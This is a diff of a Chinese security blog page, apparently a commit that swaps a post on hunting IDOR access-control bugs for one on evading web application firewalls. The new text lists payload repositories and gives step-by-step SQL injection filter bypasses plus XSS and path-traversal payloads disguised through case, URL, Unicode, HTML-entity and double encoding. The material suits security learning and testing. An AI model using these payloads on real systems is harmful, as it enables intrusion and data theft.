@@ -5,12 +5,13 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
     <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>如何挖到更多的IDOR漏洞 - try harder</title>
+    <title>各种WAF绕过手法学习 - try harder</title>
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     
-    <meta name="description" content="如何挖到更多的IDOR漏洞PrefaceIDOR，Insecure Direct Object reference，即”不安全的直接对象引用”，场景为基于用户提供的输入对象进行访问时，未进行权限验证,"> 
+    <meta name="description" content="各种WAF绕过手法学习工欲善其事，必先利其器
+1.Seclists/Fuzzinghttps://github.com/danielmiessler/SecLists/tree/master/Fuz,"> 
     <meta name="author" content="Swyiic"> 
     <link rel="alternative" href="atom.xml" title="try harder" type="application/atom+xml"> 
     <!-- <link rel="icon" href="/img/favicon.png">  -->
@@ -57,7 +58,7 @@
     <div class="navigation animated fadeIn fast delay-1s">
         <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="https://swyiic.github.io">
         <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
-        <h3 class="subtitle">如何挖到更多的IDOR漏洞</h3>
+        <h3 class="subtitle">各种WAF绕过手法学习</h3>
         <div class="social">
             <!--        <div class="like-icon">-->
             <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
@@ -87,18 +88,19 @@
         <div class="else">
             <p class="animated fadeInDown">
                 
-                <a href="javascript:;"><b>「 </b>文章<b> 」</b></a>
+                <a href="/categories/Bypass WAF"><b>「
+                    </b>BYPASS WAF<b> 」</b></a>
                 
-                十二月 29, 2019
+                十二月 30, 2019
             </p>
-            <h3 class="post-title animated fadeInDown"><a href="/2019/12/29/%E5%A6%82%E4%BD%95%E6%8C%96%E5%88%B0%E6%9B%B4%E5%A4%9A%E7%9A%84IDOR%E6%BC%8F%E6%B4%9E/" title="如何挖到更多的IDOR漏洞" class="">如何挖到更多的IDOR漏洞</a>
+            <h3 class="post-title animated fadeInDown"><a href="/2019/12/30/%E5%90%84%E7%A7%8DWAF%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/" title="各种WAF绕过手法学习" class="">各种WAF绕过手法学习</a>
             </h3>
             
             <p class="post-count animated fadeInDown">
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>文章字数</i>
-                    5k
+                    5.1k
                 </span>
                 
                 
@@ -117,7 +119,7 @@
             </p>
             
             
-            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/%E8%B6%8A%E6%9D%83%EF%BC%8CIDOR/" rel="tag">越权，IDOR</a></li></ul>
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/Bypass-WAF/" rel="tag">Bypass WAF</a></li></ul>
             
         </div>
     </div>
@@ -138,66 +140,47 @@
 <div class="article">
     <div class='main'>
         <div class="content markdown animated fadeIn">
-            <h1 id="如何挖到更多的IDOR漏洞"><a href="#如何挖到更多的IDOR漏洞" class="headerlink" title="如何挖到更多的IDOR漏洞"></a>如何挖到更多的IDOR漏洞</h1><h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p><em>IDOR，Insecure Direct Object reference，即”不安全的直接对象引用”，场景为基于用户提供的输入对象进行访问时，未进行权限验证。IDOR漏洞其实在越权（Broken Access Control）漏洞的范畴之内，也可以说是逻辑漏洞，或是访问控制漏洞，国内通常被称为越权漏洞。</em></p>
-<p><em>然而，IDOR漏洞并不像增减和切换数字ID号那样简单，随着应用程序的功能变得越来越复杂，它们引用资源的方式也形式多样，这也意味着简单的数字形式的IDOR漏洞在大多数网络应用中变得越来越少。IDOR在Web应用中会以不同的方式体现出来，除了通常的简单数字ID号之外，这里我们再来讨论几个值得注意的点。</em></p>
-<blockquote>
-<h2 id="去意想不到的地方寻找IDOR漏洞"><a href="#去意想不到的地方寻找IDOR漏洞" class="headerlink" title="去意想不到的地方寻找IDOR漏洞"></a>去意想不到的地方寻找IDOR漏洞</h2><blockquote>
-<h3 id="别忘了编码或是哈希过的ID号"><a href="#别忘了编码或是哈希过的ID号" class="headerlink" title="别忘了编码或是哈希过的ID号"></a><em>别忘了编码或是哈希过的ID号</em></h3><p>当我们面对的是一个编码ID时，总有可能用某种方法来把这个编码ID进行解码。如果Web应用使用的是哈希或随机的ID编码，此时我们就要看看这个ID是否是可猜测的。有时Web应用使用的是一些不充分信息熵的算法（algorithms that produce insufficient entropy），其实经过仔细分析后，我们是可以去预测ID号的。比如，我们可以注册几个账户去分析这种ID号的具体生成模式，然后就得总结得到其它用户ID号的生成方法。</p>
-</blockquote>
-</blockquote>
-<p>另外，也可以通过其它的API接口中来窥探一些泄露的随机或编码ID，比如Web应用的一些公开页面，如用户资料信息页面、referer链接等。</p>
-<p>比如，如果我找到一个API接口，它的功能是允许用户通过一个编码会话ID获取到属于自己的一些详细私信内容，其请求格式如下：  </p>
-<p><code>GET /api_v1/messages?conversation_id=SOME_RANDOM_ID</code>  </p>
-<p> 乍一看，其中的的会话ID（conversation_id）非常长，而且是随机的字母数字组合序列，但是之后我发现，可以使用用户ID号去获取属于每个用户对应的一个会话列表,如下所示: </p>
-<p><code>GET /api_v1/messages?user_id=ANOTHER_USERS_ID</code>  </p>
-<p>而在这个会话列表中就包含了属于用户的会话ID号（conversation_id），又因为用户ID（user_id）可以在每个用户的资料页面中公开找到，因此，组合利用这两个ID号，我就能通过接口/api_v1/messages去读取任意用户和私信会话内容了！</p>
-<blockquote>
-<blockquote>
-<h3 id="如果无法猜测，可以尝试创建"><a href="#如果无法猜测，可以尝试创建" class="headerlink" title="如果无法猜测，可以尝试创建"></a><em>如果无法猜测，可以尝试创建</em></h3><p>比如，如果对象引用号（object reference IDs）无法预测，可以看看能有什么操作来影响这种ID号的创建或链接过程。  </p>
-</blockquote>
-</blockquote>
-<h3 id="给Web应用提供一个请求ID，哪怕它没作要求"><a href="#给Web应用提供一个请求ID，哪怕它没作要求" class="headerlink" title="给Web应用提供一个请求ID，哪怕它没作要求"></a><em>给Web应用提供一个请求ID，哪怕它没作要求</em></h3><p>如果Web应用在请求动作中没有ID号要求，那么可以尝试给它添加一个ID号看看会发生什么。比如添加一个随机ID号、用户ID、会话ID，或是其它的对象引用参数，观察服务端的响应内容。如下列请求接口用于显示当前用户所属的私信会话内容： </p>
-<p><code>GET /api_v1/messages</code>  </p>
-<p>那要是把它换成这种样式，会不会显示出其它用户的会话内容呢?  </p>
-<p><code>GET /api_v1/messages?user_id=ANOTHER_USERS_ID</code></p>
-<blockquote>
-<blockquote>
-<h3 id="使用HTTP参数污染方法（HPP-HTTP-parameter-pollution）"><a href="#使用HTTP参数污染方法（HPP-HTTP-parameter-pollution）" class="headerlink" title="使用HTTP参数污染方法（HPP,HTTP parameter pollution）"></a><em>使用HTTP参数污染方法（HPP,HTTP parameter pollution）</em></h3><p>用HTTP参数污染方式针对同一参数去给它多个不同的值，这样也是可以导致IDOR漏洞的。因为Web应用可能在设计时不会料想到用户会为某个参数提交多个不同值，因此，有时可能会导致Web后端接口的访问权限绕过。虽然这种情况非常少见，我也从来没遇到，但从理论上来说，它是有可能实现的。如以下请求接口：  </p>
-</blockquote>
-</blockquote>
-<p><code>GET /api_v1/messages?user_id=ANOTHER_USERS_ID</code> </p>
-<p>如果对它发起请求失败，那么我们可以尝试发起另外如下的请求：  </p>
-<p><code>GET /api_v1/messages?user_id=YOUR_USER_ID&amp;user_id=ANOTHER_USERS_ID</code></p>
-<p>或是这种请求：<br><code>GET /api_v1/messages?user_id=ANOTHER_USERS_ID&amp;user_id=YOUR_USER_ID</code><br>又或是换成这种把参数列表化的请求：<br><code>GET /api_v1/messages?user_ids[]=YOUR_USER_ID&amp;user_ids[]=ANOTHER_USERS_ID</code></p>
-<blockquote>
-<blockquote>
-<h3 id="使用盲IDOR法（Blind-IDORs"><a href="#使用盲IDOR法（Blind-IDORs" class="headerlink" title="使用盲IDOR法（Blind IDORs"></a><em>使用盲IDOR法（Blind IDORs</em></h3></blockquote>
-</blockquote>
-<p>有些场景下，易受IDOR漏洞影响的接口不会直接响应出来请求查询的信息，但它们可以导致Web应用在其它方面泄露信息，如导出文件、邮件或是文本提醒等。</p>
-<blockquote>
-<blockquote>
-<h3 id="改变请求方法"><a href="#改变请求方法" class="headerlink" title="改变请求方法"></a><em>改变请求方法</em></h3><p>如果某个请求方法无效，那么可以试试其它方法，如GET, POST, PUT, DELETE, PATCH…等，一个通常的技巧就是用PUT和POST进行互换，原因在于服务端的访问控制措施不够完善。</p>
-</blockquote>
-</blockquote>
-<blockquote>
-<blockquote>
-<h3 id="改变请求文件的类型"><a href="#改变请求文件的类型" class="headerlink" title="改变请求文件的类型"></a><em>改变请求文件的类型</em></h3><p>切换请求文件的类型可能会导致Web服务端在授权处理上发生不同，如在请求URL后加上一个.json，看看响应结果如何。  </p>
-</blockquote>
-</blockquote>
-<blockquote>
-<h2 id="如何提高IDOR漏洞的危害性"><a href="#如何提高IDOR漏洞的危害性" class="headerlink" title="如何提高IDOR漏洞的危害性"></a>如何提高IDOR漏洞的危害性</h2></blockquote>
-<blockquote>
-<blockquote>
-<h3 id="严重性IDOR优先"><a href="#严重性IDOR优先" class="headerlink" title="严重性IDOR优先"></a>严重性IDOR优先</h3></blockquote>
-</blockquote>
-<p>找IDOR漏洞时首先要考虑的是其对目标网站关键业务的影响程度，国内所有Src都是根据核心业务，中心业务和边缘业务判定其漏洞危险等级。所以，读写型IDOR漏洞都属于高危型IDOR漏洞。</p>
-<p>按照状态改变型state-changing (可写型) IDOR漏洞来看，其导致的密码可重置、密码可更改或账户恢复等操作都会对目标网站关键业务造成严重影响，而那种更改邮件订阅设置的IDOR漏洞影响就较低。</p>
-<p>而对于状态不可改变型non-state-changing（可读型）IDOR漏洞来看，我们就要去关注它其中对敏感信息的处理操作，比如，对用户私信会话的处理、对用户敏感信息的处理，或是非公开内容的处理。考虑Web应用中哪些功能会处理这些数据，然后有目标的去查找类似IDOR漏洞。</p>
-<blockquote>
-<blockquote>
-<h3 id="存储型XSS（Stored-XSS）"><a href="#存储型XSS（Stored-XSS）" class="headerlink" title="存储型XSS（Stored-XSS）"></a>存储型XSS（Stored-XSS）</h3><p>如果把可写型IDOR和self-XSS（需要受害者交互的XSS）结合，那么就有可能形成针对某个特定用户的存储型XSS（Stored-XSS）。它的用武之处在哪呢？比如，如果你发现了一个可以更改另外一个用户购物车列表的IDOR漏洞，实际来说，该IDOR漏洞危害并不高，充其量只会引起受害者的一些麻烦，但如果把它和self-XSS配合利用的话，在某个用户提交点，就能通过IDOR把XSS利用代码传递给受害者浏览器端，最后的效果是，它就形成了针对特定受害用户且无需交互的存储型XSS.</p>
-</blockquote>
-</blockquote>
+            <h1 id="各种WAF绕过手法学习"><a href="#各种WAF绕过手法学习" class="headerlink" title="各种WAF绕过手法学习"></a>各种WAF绕过手法学习</h1><p><del>工欲善其事，必先利其器</del></p>
+<p>1.Seclists/Fuzzing<br><a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing" target="_blank" rel="noopener">https://github.com/danielmiessler/SecLists/tree/master/Fuzzing</a></p>
+<p>2.Fuzz-DB/Attack<br><a href="https://github.com/fuzzdb-project/fuzzdb/tree/master/attack" target="_blank" rel="noopener">https://github.com/fuzzdb-project/fuzzdb/tree/master/attack</a></p>
+<p>3.Other Payloads 可能会被ban ip，小心为妙。<br><a href="https://github.com/foospidy/payloads" target="_blank" rel="noopener">https://github.com/foospidy/payloads</a></p>
+<p>#</p>
+<h2 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h2><p><em>多少waf 使用正则匹配。黑名单检测/bypass</em><br>Case: SQL 注入<br>• Step 1:<br>    过滤关键词: and, or, union<br>    可能正则: preg_match(‘/(and|or|union)/i’, $id)<br>    被拦截的语句: union select user, password from users</p>
+<pre><code>bypass语句: 1 || (select user from users where user_id = 1) = &apos;admin&apos;</code></pre><p>• Step 2:<br>    过滤关键词: and, or, union, where<br>    被拦截的语句: 1 || (select user from users where user_id = 1) = ‘admin’</p>
+<pre><code>bypass语句: 1 || (select user from users limit 1) = &apos;admin&apos;</code></pre><p>• Step 3:<br>过滤关键词: and, or, union, where, limit<br>被拦截的语句: 1 || (select user from users limit 1) = ‘admin’</p>
+<pre><code>bypass语句: 1 || (select user from users group by user_id having user_id = 1) = &apos;admin&apos;</code></pre><p>• Step 4:<br>过滤关键词: and, or, union, where, limit, group by<br>被拦截的语句: 1 || (select user from users group by user_id having user_id = 1) = ‘admin’</p>
+<pre><code>bypass语句: 1 || (select substr(group_concat(user_id),1,1) user from users ) = 1</code></pre><p>• Step 5:<br>过滤关键词: and, or, union, where, limit, group by, select</p>
+<p>被拦截的语句: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1</p>
+<pre><code>bypass语句: 1 || 1 = 1 into outfile &apos;result.txt&apos;
+bypass语句: 1 || substr(user,1,1) = &apos;a&apos;</code></pre><p>• Step 6:<br>过滤关键词: and, or, union, where, limit, group by, select, ‘</p>
+<p>被拦截的语句: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1</p>
+<pre><code>bypass语句: 1 || user_id is not null
+bypass语句: 1 || substr(user,1,1) = 0x61
+bypass语句: 1 || substr(user,1,1) = unhex(61)</code></pre><p>• Step 7:<br>过滤关键词: and, or, union, where, limit, group by, select, ‘, hex<br>被拦截的语句: 1 || substr(user,1,1) = unhex(61)</p>
+<pre><code>bypass语句: 1 || substr(user,1,1) = lower(conv(11,10,36))</code></pre><p>• Step 8:<br>过滤关键词: and, or, union, where, limit, group by, select, ‘, hex, substr<br>被拦截的语句: 1 || substr(user,1,1) = lower(conv(11,10,36))</p>
+<pre><code>bypass语句: 1 || lpad(user,7,1)</code></pre><p>• Step 9:<br>过滤关键词: and, or, union, where, limit, group by, select, ‘, hex, substr, white space<br>被拦截的语句: 1 || lpad(user,7,1)</p>
+<pre><code>bypass语句: 1%0b||%0blpad(user,7,1)</code></pre><h2 id="混淆-编码"><a href="#混淆-编码" class="headerlink" title="混淆/编码"></a>混淆/编码</h2><ol>
+<li><p>大小写:<br> 标准: <code>&lt;script&gt;alert()&lt;/script&gt;</code><br> Bypassed: <code>&lt;ScRipT&gt;alert()&lt;/sCRipT&gt;</code></p>
+<p> 标准: <code>SELECT * FROM all_tables WHERE OWNER = &#39;DATABASE_NAME&#39;</code><br> Bypassed: <code>sELecT * FrOm all_tables whERe OWNER = &#39;DATABASE_NAME&#39;</code>  </p>
+</li>
+<li><p>URL 编码:<br> 被阻断语句: <code>&lt;svG/x=&quot;&gt;&quot;/oNloaD=confirm()//</code><br> Bypassed: <code>%3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F</code></p>
+<p> 被阻断语句: <code>uNIoN(sEleCT 1,2,3,4,5,6,7,8,9,10,11,12)</code><br> Bypassed: <code>uNIoN%28sEleCT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29</code>  </p>
+</li>
+<li><p>Unicode 编码:<br> 标准: <code>&lt;marquee onstart=prompt()&gt;</code><br> 混淆: <code>&lt;marquee onstart=\u0070r\u06f\u006dpt()&gt;</code></p>
+<p> 被阻断语句: <code>/?redir=http://google.com</code><br> Bypassed: <code>/?redir=http://google。com (Unicode 替代)</code>  </p>
+<p> 被阻断语句: <code>&lt;marquee loop=1 onfinish=alert()&gt;x</code><br> Bypassed: <code>＜marquee loop＝1 onfinish＝alert︵1)&gt;x (Unicode 替代)</code></p>
+</li>
+<li><p>HTML 实体编码:<br> 标准: <code>&quot;&gt;&lt;img src=x onerror=confirm()&gt;</code><br> Encoded: <code>&amp;quot;&amp;gt;&amp;lt;img src=x onerror=confirm&amp;lpar;&amp;rpar;&amp;gt; (General form)</code><br> Encoded: <code>&amp;#34;&amp;#62;&amp;#60;img src=x onerror=confirm&amp;#40;&amp;#41;&amp;#62; (Numeric reference)</code></p>
+</li>
+<li><p>混合编码:<br> WAF规则通常倾向于滤除特定类型的编码.混合编码有效载荷可以绕过这种类型的过滤器.制表符和换行符进一步增加了混淆.  </p>
+</li>
+<li><p>混淆:<br> <code>&lt;A HREF=&quot;h</code><br> <code>tt p://6 6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;</code></p>
+</li>
+<li><p>双重URL编码:<br>这个需要服务端多次解析了url编码</p>
+<p> 标准: <code>http://victim/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\</code><br> 混淆: <code>http://victim/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\</code></p>
+<p> 标准: <code>&lt;script&gt;alert()&lt;/script&gt;</code><br> 混淆: <code>%253Cscript%253Ealert()%253C%252Fscript%253E</code></p>
+</li>
+</ol>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls"
@@ -256,7 +239,7 @@
             <div class="box sticky animated fadeInRight faster">
                 <div id="toc" class="subbox">
                     <h4>目录</h4>
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#如何挖到更多的IDOR漏洞"><span class="toc-number">1.</span> <span class="toc-text">如何挖到更多的IDOR漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Preface"><span class="toc-number">1.1.</span> <span class="toc-text">Preface</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#去意想不到的地方寻找IDOR漏洞"><span class="toc-number">1.2.</span> <span class="toc-text">去意想不到的地方寻找IDOR漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#别忘了编码或是哈希过的ID号"><span class="toc-number">1.2.1.</span> <span class="toc-text">别忘了编码或是哈希过的ID号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如果无法猜测，可以尝试创建"><span class="toc-number">1.2.2.</span> <span class="toc-text">如果无法猜测，可以尝试创建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#给Web应用提供一个请求ID，哪怕它没作要求"><span class="toc-number">1.2.3.</span> <span class="toc-text">给Web应用提供一个请求ID，哪怕它没作要求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用HTTP参数污染方法（HPP-HTTP-parameter-pollution）"><span class="toc-number">1.2.4.</span> <span class="toc-text">使用HTTP参数污染方法（HPP,HTTP parameter pollution）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用盲IDOR法（Blind-IDORs"><span class="toc-number">1.2.5.</span> <span class="toc-text">使用盲IDOR法（Blind IDORs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#改变请求方法"><span class="toc-number">1.2.6.</span> <span class="toc-text">改变请求方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#改变请求文件的类型"><span class="toc-number">1.2.7.</span> <span class="toc-text">改变请求文件的类型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如何提高IDOR漏洞的危害性"><span class="toc-number">1.3.</span> <span class="toc-text">如何提高IDOR漏洞的危害性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#严重性IDOR优先"><span class="toc-number">1.3.1.</span> <span class="toc-text">严重性IDOR优先</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存储型XSS（Stored-XSS）"><span class="toc-number">1.3.2.</span> <span class="toc-text">存储型XSS（Stored-XSS）</span></a></li></ol></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#各种WAF绕过手法学习"><span class="toc-number">1.</span> <span class="toc-text">各种WAF绕过手法学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#正则绕过"><span class="toc-number">1.1.</span> <span class="toc-text">正则绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#混淆-编码"><span class="toc-number">1.2.</span> <span class="toc-text">混淆&#x2F;编码</span></a></li></ol></li></ol>
                 </div>
             </div>
             
